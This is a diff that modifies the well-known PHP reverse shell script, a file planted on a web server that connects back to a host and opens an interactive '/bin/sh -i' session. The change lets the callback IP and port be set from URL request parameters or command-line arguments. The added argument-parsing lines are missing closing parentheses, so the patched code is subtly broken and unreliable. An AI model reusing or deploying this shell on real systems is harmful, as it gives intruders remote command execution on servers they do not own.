@@ -43,17 +43,31 @@
 // Usage
 // -----
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+// 
+// Changes by GramThanos
+// -----
+// IP and Port definition from URL parameters or CMD arguments (PHP >= 4.3.0)
+// 
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '127.0.0.1';  // DEFAULT
+$port = 1234;       // DEFAULT
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
 $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
+
+// Get IP and Port from URL parameters
+if (isset($_REQUEST['ip'])) $ip = $_REQUEST['ip'];
+if (isset($_REQUEST['port'])) $port = $_REQUEST['port'];
+// Get IP and Port from CMD arguments
+if (isset($argv)) {
+	if (isset($argv[1]) $ip = $argv[1];
+	if (isset($argv[2]) $port = $argv[2];
+}
 
 //
 // Daemonise ourself if possible to avoid zombies later
